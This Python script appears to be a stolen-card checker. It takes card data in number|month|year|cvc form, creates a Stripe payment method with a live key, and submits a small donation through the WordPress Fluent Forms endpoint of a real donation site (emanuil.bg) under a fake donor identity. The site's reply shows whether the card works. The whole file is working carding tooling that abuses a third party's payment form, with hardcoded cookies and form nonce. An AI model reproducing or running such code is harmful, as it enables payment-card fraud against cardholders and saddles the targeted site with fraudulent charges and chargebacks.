import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F698b2f41bb%3B+stripe-js-v3%2F698b2f41bb%3B+card-element&key=pk_live_51P3NpSLxkq1DmcIzN7Q0oc425vK4pBk0uHWpsCQUdZvTOZFjzNKPzQ7tesjTo9JbkDMKkIOcYgEg231A2zzg2KCQ00yW9qeFoV'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__stripe_mid': '99244f4b-124d-4365-a53e-94dfd94f1fa79b2c81',
	    '__stripe_sid': '9e424b1f-643d-41f3-b5d0-a3504cbb927fadbdec',
	}
	
	headers = {
	    'authority': 'emanuil.bg',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=99244f4b-124d-4365-a53e-94dfd94f1fa79b2c81; __stripe_sid=9e424b1f-643d-41f3-b5d0-a3504cbb927fadbdec',
	    'origin': 'https://emanuil.bg',
	    'referer': 'https://emanuil.bg/darenie/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1744904897713',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=17&_fluentform_5_fluentformnonce=fb9a23e3a7&_wp_http_referer=%2Fdarenie%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&dropdown=%D0%9E%D0%B1%D1%89%D0%BE%20%D0%B4%D0%B0%D1%80%D0%B5%D0%BD%D0%B8%D0%B5&payment_input=%D0%98%D1%81%D0%BA%D0%B0%D0%BC%20%D0%B4%D0%B0%20%D0%B2%D1%8A%D0%B2%D0%B5%D0%B4%D0%B0%20%D1%81%D1%83%D0%BC%D0%B0%20%D0%BF%D0%BE%20%D0%B8%D0%B7%D0%B1%D0%BE%D1%80&custom-payment-amount=5&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '5',
	}
	
	r2 = requests.post('https://emanuil.bg/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
	

